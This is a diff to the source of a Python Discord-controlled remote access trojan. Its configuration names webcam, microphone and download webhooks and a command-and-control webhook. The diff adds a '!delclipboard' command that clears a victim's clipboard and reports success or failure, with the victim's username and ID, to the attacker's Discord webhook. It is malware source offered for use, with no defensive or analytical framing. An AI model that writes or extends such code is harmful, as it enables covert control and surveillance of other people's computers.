@@ -72,6 +72,7 @@ WEB_CAM_ID = "[WEBCAM_WEBHOOK]"
 MIC_ID = "[MICROPHONE_WEBHOOK]"
 DOWNLOAD_ID = "[DOWNLOAD_WEBHOOK]"
 BOT_TOKEN = "[BOT_TOKEN_HERE]"
+
 version = "v1.0.0"
 author = "Vczz0"
 github_link = "https://github.com/Vczz0"
@@ -1589,5 +1590,23 @@ async def remove(ctx):
             webhook.add_embed(embed) 
             response = webhook.execute()
 
+@bot.command(name="delclipboard", pass_ctx=True)
+async def remove(ctx):
+    command = ctx.message.content.replace("!delclipboard", "")
+    check_id = command.split()
+    if int(check_id[0]) == int(ID):
+        try:
+            clip_value = str("")
+            pyperclip.copy(str(clip_value))
+            spam = pyperclip.paste()
+            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
+            embed = DiscordEmbed(title=f"**Successfull setted clipboard on: {usr} #{ID}**", description=f"{clip_value}", color='09e30d')
+            webhook.add_embed(embed)
+            response = webhook.execute()
+        except Exception as e:
+            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
+            embed = DiscordEmbed(title=f"**Failed to set clipboard on: {usr} #{ID}**", description=f"{e}", color='ff0000')
+            webhook.add_embed(embed) 
+            response = webhook.execute()
 
 bot.run(BOT_TOKEN)
